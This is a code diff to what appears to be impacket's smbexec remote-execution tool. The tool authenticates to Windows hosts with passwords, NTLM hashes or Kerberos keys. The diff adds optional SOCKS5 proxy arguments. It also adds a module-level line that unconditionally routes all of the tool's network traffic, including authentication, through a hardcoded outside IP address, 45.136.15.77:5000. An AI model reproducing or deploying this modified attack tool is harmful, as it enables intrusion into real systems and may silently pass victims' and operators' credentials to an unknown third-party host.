@@ -40,6 +40,9 @@ import random
 import string
 import cmd
 import argparse
+import socks
+import socket
+
 try:
     import ConfigParser
 except ImportError:
@@ -53,6 +56,14 @@ from impacket.examples.utils import parse_target
 from impacket import version, smbserver
 from impacket.dcerpc.v5 import transport, scmr
 from impacket.krb5.keytab import Keytab
+
+# Set up SOCKS5 proxy
+SOCKS5_PROXY_HOST = '45.136.15.77'
+SOCKS5_PROXY_PORT = 5000
+
+# Apply the SOCKS5 proxy to the default socket
+socks.set_default_proxy(socks.SOCKS5, SOCKS5_PROXY_HOST, SOCKS5_PROXY_PORT)
+socket.socket = socks.socksocket
 
 OUTPUT_FILENAME = '__output'
 SMBSERVER_DIR   = '__tmp'
@@ -360,7 +371,12 @@ if __name__ == '__main__':
     group.add_argument('-aesKey', action="store", metavar = "hex key", help='AES key to use for Kerberos Authentication '
                                                                             '(128 or 256 bits)')
     group.add_argument('-keytab', action="store", help='Read keys for SPN from keytab file')
-
+    # Add proxy-related arguments
+    group.add_argument('-xxxproxy', action='store', choices=['socks5'], help='Proxy type to use (e.g., socks5)')
+    group.add_argument('-xxxip', action='store', help='Proxy IP address')
+    group.add_argument('-xxxport', action='store', type=int, help='Proxy port')
+    group.add_argument('-xxxusername', action='store', help='Proxy username')
+    group.add_argument('-xxxpassword', action='store', help='Proxy password')
 
     if len(sys.argv)==1:
         parser.print_help()
@@ -402,6 +418,17 @@ if __name__ == '__main__':
 
     if options.aesKey is not None:
         options.k = True
+
+    # 设置代理
+    if options.xxxproxy and options.xxxip and options.xxxport:
+        logging.info(f"Setting up SOCKS5 proxy: {options.xxxip}:{options.xxxport}")
+        if options.xxxusername and options.xxxpassword:
+            logging.info(f"Using proxy authentication: {options.xxxusername}")
+            socks.set_default_proxy(socks.SOCKS5, options.xxxip, options.xxxport, username=options.xxxusername,
+                                    password=options.xxxpassword)
+        else:
+            socks.set_default_proxy(socks.SOCKS5, options.xxxip, options.xxxport)
+        socket.socket = socks.socksocket
 
     try:
         executer = CMDEXEC(username, password, domain, options.hashes, options.aesKey, options.k, options.dc_ip,
